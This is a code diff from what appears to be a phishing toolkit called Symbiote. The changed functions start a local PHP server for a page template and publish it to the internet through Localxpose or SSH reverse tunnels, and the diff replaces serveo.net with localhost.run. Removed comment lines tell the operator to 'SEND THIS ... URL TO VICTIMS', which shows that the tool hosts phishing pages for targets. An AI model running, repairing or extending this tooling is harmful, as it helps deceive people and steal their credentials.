@@ -134,44 +134,28 @@ def randomLocalxpose(port):
     print("\n\n{5}-------------------------------\n{0} [ {2}RANDOM LOCALXPOSE URL !!{0}] \n{5}-------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    sleep(2)
+    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 ".format(name,port))
     system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
-    sleep(7)
-    try:
-        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = output.decode('utf-8')
-        print("done")
-        #print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
-        #print("\n")
-        #printoutput('r_loclx',url,port)
-        r_loclxoutput('r_loclx',url,port)
-    except CalledProcessError:
-        sleep(1)
-        system('clear')
-        return randomLocalxpose(port)
+    sleep(10)
+    f=open("link.url", "r")
+    url=(f"{f.read().split(',')[1]}")
+    f.close()
+    r_loclxoutput('r_loclx',url,port)
 
 
 def randomServeo(port):
     system('clear')
     sbanner()
-    print("\n\n{5}-------------------------------\n{0}[{2} RANDOM SERVEO URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
+    print("\n\n{5}-------------------------------\n{0}[{2} RANDOM localhost URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
     print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
-    sleep(2)
-    try:
-        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
-        url = output.decode("utf-8")
-        #printoutput('serveo',url,port)
-        serveo('serveo',url,port)
-        #print("\n{0}[{2}!{0}]{2} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} SERVEO URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url )
-        print("\n")
-    except CalledProcessError:
-        sleep(2)
-        system('clear')
-        return randomServeo(port)
+    system('ssh -R 80:localhost:%s ssh.localhost.run > link.url 2> /dev/null &' % (port))
+    sleep(10)
+    f=open("link.url", "r")
+    url=(f"{f.read().split(',')[1]}")
+    f.close()
+    localhost('localhost',url,port)
 
 
 def selectServer(port):
@@ -181,7 +165,7 @@ def selectServer(port):
     sbanner()
     print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
     print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}Serveo {5}({0}Currently DOWN{5})\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}localhost.run {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     if choice == '1':
         system('clear')
